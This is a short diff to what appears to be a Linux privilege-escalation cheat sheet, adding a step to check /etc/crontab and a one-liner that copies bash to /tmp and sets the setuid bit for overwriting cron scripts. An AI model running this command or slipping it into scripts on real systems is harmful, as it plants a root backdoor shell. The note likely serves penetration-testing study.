@@ -52,8 +52,15 @@ id
 find / -user username 2> /dev/null
 ```
 
-- Check `/etc/crontab` for interesting cronjobs. See if we can do malicious overwrites such as
+- Check for interesting cronjobs. 
+
 ```
+cat /etc/crontab
+```
+
+A nice one liner to overwrite in scripts is
+
+```shell
 cp /bin/bash /tmp/bash; chmod +s /tmp/bash
 ```
 
